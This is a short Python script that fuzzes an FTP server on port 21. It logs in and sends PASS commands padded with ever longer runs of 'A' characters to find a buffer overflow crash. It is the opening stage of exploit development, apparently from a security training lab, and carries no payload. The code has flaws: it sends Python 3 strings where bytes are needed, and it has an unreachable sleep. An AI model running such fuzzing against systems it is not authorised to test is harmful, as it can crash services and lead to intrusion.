#!/usr/bin/python3

import socket
import time
import sys

ip = ""
port = 21

buffer = []
counter = 100

while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        timeout = 10

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        s.send("USER username\r\n")
        s.recv(1024)
        print("Fuzzing PASS with %s bytes" % len(string))
        s.send("PASS " + string + "\r\n")
        s.recv(1024)
        s.send("QUIT\r\n")
        s.recv(1024)
        s.close()
    except:
        print("No connection received back from " + ip + ":" + str(port))
        sys.exit(0)
        time.sleep(1)
